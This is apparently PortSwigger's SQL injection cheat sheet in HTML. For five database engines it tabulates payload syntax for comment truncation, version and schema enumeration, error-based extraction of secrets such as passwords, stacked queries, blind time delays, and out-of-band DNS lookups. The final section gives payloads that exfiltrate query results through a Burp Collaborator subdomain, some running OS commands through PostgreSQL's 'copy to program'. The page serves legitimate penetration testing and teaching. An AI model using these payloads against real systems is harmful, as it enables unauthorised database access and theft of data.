<h1>SQL injection cheat sheet</h1>
<p>
    This <a href="https://portswigger.net/web-security/sql-injection">SQL injection</a> cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.<br />
    Also checkout <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20injection">SQL Injection from PayloadsAllTheThings</a>.
</p>

<h2>String concatenation</h2>
<p>
    You can concatenate together multiple strings to make a single string.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <code>'foo'||'bar'</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td><code>'foo'+'bar'</code></td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td><code>'foo'||'bar'</code></td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>'foo' 'bar'</code> [Note the space between the two strings] <br />
            <code>CONCAT('foo','bar')</code>
        </td>
    </tr>
    <tr>
        <th>
            SQLite
        </th>
        <td>
            <code>'foo' || 'bar'</code> [Note the space between the two strings] <br />
            <code>CONCAT('foo','bar')</code>
        </td>
    </tr>

</table>

<h2>Substring</h2>
<p>
    You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string <code>ba</code>.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td><code>SUBSTR('foobar', 4, 2)</code></td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>SUBSTRING('foobar', 4, 2)</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>SUBSTRING('foobar', 4, 2)</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>SUBSTRING('foobar', 4, 2)</code>
        </td>
    </tr>
    <tr>
        <th>
            SQLite
        </th>
        <td>
            <code>SUBSTR('foobar', 4, 2)</code>
        </td>
    </tr>
</table>

<h2>Comments</h2>
<p>
    You can use comments to truncate a query and remove the portion of the original query that follows your input.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <code>--comment</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>--comment</code><br />
            <code>/*comment*/</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>--comment</code><br/>
            <code>/*comment*/</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>#comment</code><br />
            <code>-- comment</code> [Note the space after the double dash]<br />
            <code>/*comment*/</code>
        </td>
    </tr>
    <tr>
        <th>
            SQLite
        </th>
        <td>
            <code>--comment</code><br/>
            <code>/*comment*/</code>
        </td>
    </tr>
</table>

<h2>Database version</h2>
<p>
    You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <code>SELECT banner FROM v$version</code><br />
            <code>SELECT version FROM v$instance</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>SELECT @@version</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>SELECT version()</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>SELECT @@version</code>
        </td>
    </tr>
    <tr>
        <th>
            SQLite
        </th>
        <td>
            <code>SELECT sqlite_version()</code>
            <code>SELECT sqlite_source_id()</code>
        </td>
    </tr>
</table>

<h2>Database contents</h2>
<p>
    You can list the tables that exist in the database, and the columns that those tables contain.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <code>SELECT * FROM all_tables</code><br />
            <code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>SELECT * FROM information_schema.tables</code><br />
            <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>SELECT * FROM information_schema.tables</code><br />
            <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>SELECT * FROM information_schema.tables</code><br />
            <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
        </td>
    </tr>
    <tr>
        <th>
            SQLite
        </th>
        <td>
            <code>SELECT name FROM sqlite_master WHERE type='table'</code><br />
            <code>SELECT name FROM PRAGMA_TABLE_INFO('TABLE-NAME-HERE')</code>
        </td>
    </tr>
</table>
<div>
    <h4>Additional (non-Oracle)</h4>
    <p>
        Check <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-information-schema-views/tables-transact-sql?view=sql-server-ver16">this website</a> for column names to use in schema queries. <code>TABLE_NAME</code> is likely the most useful column for <code>information_schema.tables</code> and <code>COLUMN_NAME</code> the most useful column for <code>information_schema.columns</code>.
    </p>
    <h4>Additional (Oracle)</h4>
    <p>
        Check <a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html">this website</a> for column names to use in schema queries. <code>TABLE_NAME</code> is likely the most useful column for <code>all_tables</code> and <code>COLUMN_NAME</code> the most useful column for <code>all_tab_columns</code>.
</div>

<h2>Conditional errors</h2>
<p>
    You can test a single boolean condition and trigger a database error if the condition is true.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code>
        </td>
    </tr>
    <tr>
        <th>
            SQLite
        </th>
        <td>
            <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN load_extension(1) ELSE 'a' END</code>
        </td>
    </tr>
</table>

<h2>Extracting data via visible error messages</h2>
<p>
    You can potentially elicit error messages that leak sensitive data returned by your malicious query.
</p>
<table>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code><br />
            <code>&gt; Conversion failed when converting the varchar value 'secret' to data type int.</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code><br />
            <code>&gt; invalid input syntax for integer: "secret"</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code><br />
            <code>&gt; XPATH syntax error: '\secret'</code>
        </td>
    </tr>
</table>

<h2>Batched (or stacked) queries</h2>
<p>
    You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <code>Does not support batched queries.</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>QUERY-1-HERE; QUERY-2-HERE</code><br />
            <code>QUERY-1-HERE QUERY-2-HERE</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>QUERY-1-HERE; QUERY-2-HERE</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>QUERY-1-HERE; QUERY-2-HERE</code>
        </td>
    </tr>
</table>

<div>
    <h4>Note</h4>
    <p>
        With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
    </p>
</div>

<h2>Time delays</h2>
<p>
    You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <code>dbms_pipe.receive_message(('a'),10)</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>WAITFOR DELAY '0:0:10'</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>SELECT pg_sleep(10)</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>SELECT SLEEP(10)</code>
        </td>
    </tr>
</table>

<h2>Conditional time delays</h2>
<p>
    You can test a single boolean condition and trigger a time delay if the condition is true.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</code>
        </td>
    </tr>
</table>

<h2>DNS lookup</h2>
<p>
    You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use <a href="/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <p>(<a href="/web-security/xxe">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p>
            <code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code>
            <p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p>
            <code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            <p>The following techniques work on Windows only:</p>
            <code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br />
            <code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
        </td>
    </tr>
</table>

<h2>DNS lookup with data exfiltration</h2>
<p>
    You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use <a href="/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
</p>
<table>
    <tr>
        <th>
            Oracle
        </th>
        <td>
            <code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code>
        </td>
    </tr>
    <tr>
        <th>
            Microsoft
        </th>
        <td>
            <code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')</code>
        </td>
    </tr>
    <tr>
        <th>
            PostgreSQL
        </th>
        <td>
            <code>create OR replace function f() returns void as $$ <br />
            declare c text; <br />
            declare p text; <br />
            begin <br />
            SELECT into p (SELECT YOUR-QUERY-HERE); <br />
            c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; <br />
            execute c; <br />
            END; <br />
            $$ language plpgsql security definer; <br />
            SELECT f();</code>
        </td>
    </tr>
    <tr>
        <th>
            MySQL
        </th>
        <td>
            The following technique works on Windows only: <br />
            <code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
        </td>
    </tr>
</table>
